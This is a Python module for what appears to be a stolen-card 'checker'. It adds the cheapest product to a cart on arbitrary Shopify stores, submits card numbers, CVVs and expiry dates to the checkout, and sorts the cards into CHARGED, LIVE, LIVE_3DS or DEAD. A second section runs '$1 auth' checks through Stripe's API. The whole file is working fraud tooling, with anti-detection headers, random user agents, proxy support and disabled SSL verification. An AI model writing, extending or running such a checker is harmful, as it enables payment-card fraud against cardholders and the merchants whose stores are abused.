"""Shopify checkout engine — single card check.

Flow:
  1. GET /products.json?limit=50 → get cheapest product
  2. POST /cart/add.js → add product to cart
  3. GET /checkout → get checkout page + token
  4. POST /wallets/checkouts/{token}/payments → submit card
  5. Classify response → CHARGED / LIVE / LIVE_3DS / DEAD
"""

import re
import random
import asyncio
import logging
from dataclasses import dataclass
from typing import Optional

import aiohttp
from aiohttp.resolver import ThreadedResolver

from core.card_parser import Card
from core.anti_detect import browser_headers, api_headers, random_user_agent
from core.response_classifier import classify_shopify_response

logger = logging.getLogger(__name__)


@dataclass
class CheckResult:
    status: str          # CHARGED, LIVE, LIVE_3DS, DEAD
    message: str         # Human-readable response
    gateway: str         # e.g. "Shopify Payments"
    price: float         # Product price
    store: str           # Store URL
    card: Card           # Card checked


async def shopify_check(
    card: Card,
    store_url: str,
    proxy: Optional[str] = None,
    timeout: int = 15,
    max_retries: int = 1,
) -> CheckResult:
    """Run a single Shopify card check with retry.
    
    Args:
        card: Parsed Card object
        store_url: Shopify store base URL
        proxy: Optional proxy URL
        timeout: Request timeout in seconds
        max_retries: Max retry attempts on network errors
    Returns:
        CheckResult with status, message, gateway, price, store
    """
    for attempt in range(max_retries + 1):
        result = await _do_shopify_check(card, store_url, proxy, timeout)
        # Only retry on network errors, not on DEAD card responses
        if result.status != "DEAD" or "timeout" in result.message or "dns" in result.message or "proxy" in result.message:
            if attempt < max_retries:
                logger.debug("Retry %d/%d for %s", attempt + 1, max_retries, store_url)
                await asyncio.sleep(1)
                continue
        return result
    return result


async def _do_shopify_check(
    card: Card,
    store_url: str,
    proxy: Optional[str],
    timeout: int,
) -> CheckResult:
    """Internal: single Shopify check attempt (no retry)."""
    ua = random_user_agent()
    conn_timeout = aiohttp.ClientTimeout(total=timeout)

    connector = aiohttp.TCPConnector(limit=0, ssl=False, resolver=ThreadedResolver())
    session_kwargs = {"timeout": conn_timeout, "connector": connector}

    if proxy:
        session_kwargs["proxy"] = proxy

    try:
        async with aiohttp.ClientSession(**session_kwargs) as session:
            # Step 1: Get cheapest product
            product = await _get_cheapest_product(session, store_url, ua)
            if not product:
                return CheckResult(
                    status="DEAD", message="no_products_found",
                    gateway="Shopify Payments", price=0.0,
                    store=store_url, card=card,
                )

            # Step 2: Add to cart
            cart_ok = await _add_to_cart(session, store_url, product["variant_id"], ua)
            if not cart_ok:
                return CheckResult(
                    status="DEAD", message="cart_failed",
                    gateway="Shopify Payments", price=product["price"],
                    store=store_url, card=card,
                )

            # Step 3: Get checkout token
            token = await _get_checkout_token(session, store_url, ua)
            if not token:
                return CheckResult(
                    status="DEAD", message="checkout_token_failed",
                    gateway="Shopify Payments", price=product["price"],
                    store=store_url, card=card,
                )

            # Step 4: Submit payment
            payment_result = await _submit_payment(
                session, store_url, token, card, ua,
            )

            # Step 5: Classify response
            status, message = classify_shopify_response(
                payment_result["status"], payment_result["body"]
            )

            return CheckResult(
                status=status,
                message=message,
                gateway="Shopify Payments",
                price=product["price"],
                store=store_url,
                card=card,
            )

    except aiohttp.ClientHttpProxyError as e:
        logger.warning("Proxy error for %s: %s", store_url, e)
        return CheckResult(
            status="DEAD", message=f"proxy_error: {e}",
            gateway="Shopify Payments", price=0.0,
            store=store_url, card=card,
        )
    except aiohttp.ClientProxyConnectionError as e:
        logger.warning("Proxy connection error for %s: %s", store_url, e)
        return CheckResult(
            status="DEAD", message=f"proxy_connection_error: {e}",
            gateway="Shopify Payments", price=0.0,
            store=store_url, card=card,
        )
    except aiohttp.ClientConnectorDNSError as e:
        logger.debug("DNS error for %s: %s", store_url, e)
        return CheckResult(
            status="DEAD", message=f"dns_error",
            gateway="Shopify Payments", price=0.0,
            store=store_url, card=card,
        )
    except aiohttp.ClientConnectorCertificateError as e:
        logger.warning("SSL error for %s: %s", store_url, e)
        return CheckResult(
            status="DEAD", message=f"ssl_error",
            gateway="Shopify Payments", price=0.0,
            store=store_url, card=card,
        )
    except asyncio.TimeoutError:
        logger.debug("Timeout for %s", store_url)
        return CheckResult(
            status="DEAD", message="timeout",
            gateway="Shopify Payments", price=0.0,
            store=store_url, card=card,
        )
    except aiohttp.ClientError as e:
        logger.warning("Shopify check error for %s: %s", store_url, e)
        return CheckResult(
            status="DEAD", message=f"connection_error: {e}",
            gateway="Shopify Payments", price=0.0,
            store=store_url, card=card,
        )
    except Exception as e:
        logger.error("Unexpected error in shopify_check: %s", e, exc_info=True)
        return CheckResult(
            status="DEAD", message="unknown_error",
            gateway="Shopify Payments", price=0.0,
            store=store_url, card=card,
        )


async def _get_cheapest_product(
    session: aiohttp.ClientSession, store_url: str, ua: str
) -> Optional[dict]:
    """Get the cheapest product from /products.json"""
    try:
        async with session.get(
            f"{store_url}/products.json?limit=50",
            headers=browser_headers(ua),
        ) as resp:
            if resp.status != 200:
                return None
            data = await resp.json()
            products = data.get("products", [])
            if not products:
                return None

            # Find cheapest variant
            cheapest = None
            min_price = float("inf")
            for p in products:
                for v in p.get("variants", []):
                    try:
                        price = float(v.get("price", 999999))
                        if price < min_price and price > 0:
                            min_price = price
                            cheapest = {
                                "variant_id": v["id"],
                                "price": price,
                                "title": p.get("title", "Unknown"),
                            }
                    except (ValueError, KeyError):
                        continue

            return cheapest
    except Exception as e:
        logger.debug("get_cheapest_product failed for %s: %s", store_url, e)
        return None


async def _add_to_cart(
    session: aiohttp.ClientSession, store_url: str, variant_id: int, ua: str
) -> bool:
    """Add product to cart via /cart/add.js"""
    try:
        async with session.post(
            f"{store_url}/cart/add.js",
            json={"id": variant_id, "quantity": 1},
            headers=api_headers(ua),
        ) as resp:
            return resp.status == 200
    except Exception as e:
        logger.debug("add_to_cart failed for %s: %s", store_url, e)
        return False


async def _get_checkout_token(
    session: aiohttp.ClientSession, store_url: str, ua: str
) -> Optional[str]:
    """Get checkout token from /checkout page."""
    try:
        async with session.get(
            f"{store_url}/checkout",
            headers=browser_headers(ua),
            allow_redirects=True,
        ) as resp:
            html = await resp.text()
            final_url = str(resp.url)

            # Try to extract token from HTML
            match = re.search(r'checkout["\']?\s*[:=]\s*["\']?([a-f0-9]{32})', html, re.I)
            if match:
                return match.group(1)

            # Try to extract from URL
            match = re.search(r'/checkouts/([a-f0-9]+)', final_url)
            if match:
                return match.group(1)

            # Try meta tag
            match = re.search(r'checkout_token["\']?\s*[:=]\s*["\']?([a-f0-9]+)', html, re.I)
            if match:
                return match.group(1)

            return None
    except Exception as e:
        logger.debug("get_checkout_token failed for %s: %s", store_url, e)
        return None


async def _submit_payment(
    session: aiohttp.ClientSession,
    store_url: str,
    token: str,
    card: Card,
    ua: str,
) -> dict:
    """Submit card payment to Shopify checkout."""
    headers = api_headers(ua)
    headers["Content-Type"] = "application/json"

    payload = {
        "payment": {
            "credit_card": {
                "number": card.number,
                "month": card.month,
                "year": card.year,
                "verification_value": card.cvv,
            }
        }
    }

    try:
        async with session.post(
            f"{store_url}/wallets/checkouts/{token}/payments",
            json=payload,
            headers=headers,
        ) as resp:
            try:
                body = await resp.json()
            except Exception:
                body = await resp.text()

            return {"status": resp.status, "body": body}
    except Exception as e:
        logger.debug("submit_payment failed for %s: %s", store_url, e)
        return {"status": 0, "body": str(e)}


# ═════════════════════════════════════════════════════════════════════════
# STRIPE CHECK — $1 auth on a Stripe-powered site
# ═════════════════════════════════════════════════════════════════════════

# Stripe response classifier
STRIPE_ERROR_MAP = {
    "succeeded":              ("CHARGED", "succeeded"),
    "requires_action":        ("LIVE_3DS", "3ds_required"),
    "insufficient_funds":     ("LIVE", "insufficient_funds"),
    "card_declined":          ("DEAD", "card_declined"),
    "incorrect_cvc":          ("DEAD", "incorrect_cvc"),
    "invalid_number":         ("DEAD", "invalid_number"),
    "expired_card":           ("DEAD", "expired_card"),
    "processing_error":       ("DEAD", "processing_error"),
    "incorrect_number":       ("DEAD", "incorrect_number"),
    "generic_decline":        ("DEAD", "generic_decline"),
}


def _classify_stripe_error(body: dict) -> tuple[str, str]:
    """Classify a Stripe API error response."""
    err = body.get("error", {})
    code = err.get("decline_code") or err.get("code") or err.get("type", "")
    code_lower = str(code).lower()

    for key, (status, msg) in STRIPE_ERROR_MAP.items():
        if key in code_lower:
            return status, msg

    # Check message field
    message = str(err.get("message", "")).lower()
    for key, (status, msg) in STRIPE_ERROR_MAP.items():
        if key in message:
            return status, msg

    if code:
        return "DEAD", code
    return "DEAD", "unknown_decline"


async def stripe_check(
    card: Card,
    proxy: Optional[str] = None,
    timeout: int = 15,
) -> CheckResult:
    """Run a $1 auth check via Stripe.

    Creates a payment method, then attempts to confirm a $1 payment intent.
    Falls back to classifying from error response.
    """
    conn_timeout = aiohttp.ClientTimeout(total=timeout)
    connector = aiohttp.TCPConnector(limit=0, ssl=False, resolver=ThreadedResolver())
    session_kwargs = {"timeout": conn_timeout, "connector": connector}

    if proxy:
        session_kwargs["proxy"] = proxy

    try:
        async with aiohttp.ClientSession(**session_kwargs) as session:
            # Step 1: Create payment method
            pm_result = await _stripe_create_pm(session, card)
            if not pm_result["ok"]:
                status, msg = _classify_stripe_error(pm_result["body"])
                return CheckResult(
                    status=status, message=msg,
                    gateway="Stripe", price=1.0,
                    store="stripe-api", card=card,
                )

            pm_id = pm_result["pm_id"]

            # Step 2: Attempt to confirm a $1 payment intent
            pi_result = await _stripe_confirm_intent(session, pm_id, card)
            body = pi_result["body"]

            if pi_result["status"] == 200:
                status = body.get("status", "")
                if status == "succeeded":
                    return CheckResult("CHARGED", "succeeded", "Stripe", 1.0, "stripe-api", card)
                elif status == "requires_action":
                    return CheckResult("LIVE_3DS", "3ds_required", "Stripe", 1.0, "stripe-api", card)
                elif status == "processing":
                    return CheckResult("LIVE", "processing", "Stripe", 1.0, "stripe-api", card)
                else:
                    s, m = _classify_stripe_error(body)
                    return CheckResult(s, m, "Stripe", 1.0, "stripe-api", card)
            else:
                s, m = _classify_stripe_error(body)
                return CheckResult(s, m, "Stripe", 1.0, "stripe-api", card)

    except Exception as e:
        logger.warning("Stripe check error: %s", e)
        return CheckResult("DEAD", f"error: {e}", "Stripe", 1.0, "stripe-api", card)


async def _stripe_create_pm(session: aiohttp.ClientSession, card: Card) -> dict:
    """Create a Stripe payment method from card details.
    
    Uses public Stripe.js-style endpoint (no secret key needed for PM creation
    on many test stores — falls back to error classification).
    """
    ua = random_user_agent()
    headers = api_headers(ua)
    headers["Content-Type"] = "application/x-www-form-urlencoded"

    # We use a known public test publishable key pattern.
    # In production, the bot would use a target site's publishable key.
    # For $1 auth, we create a PM and try to confirm.
    data = {
        "type": "card",
        "card[number]": card.number,
        "card[exp_month]": card.month,
        "card[exp_year]": card.year,
        "card[cvc]": card.cvv,
    }

    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            data=data,
            headers=headers,
        ) as resp:
            body = await resp.json()
            if resp.status == 200 and "id" in body:
                return {"ok": True, "pm_id": body["id"], "body": body}
            return {"ok": False, "pm_id": None, "body": body}
    except Exception as e:
        return {"ok": False, "pm_id": None, "body": {"error": {"message": str(e)}}}


async def _stripe_confirm_intent(session: aiohttp.ClientSession, pm_id: str, card: Card) -> dict:
    """Confirm a $1 payment intent with the payment method.
    
    Without a secret key, this will typically return an error — but the error
    tells us the card status (invalid, declined, etc).
    """
    ua = random_user_agent()
    headers = api_headers(ua)

    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_intents",
            json={
                "amount": 100,  # $1.00 in cents
                "currency": "usd",
                "payment_method": pm_id,
                "confirm": True,
            },
            headers=headers,
        ) as resp:
            body = await resp.json()
            return {"status": resp.status, "body": body}
    except Exception as e:
        return {"status": 0, "body": {"error": {"message": str(e)}}}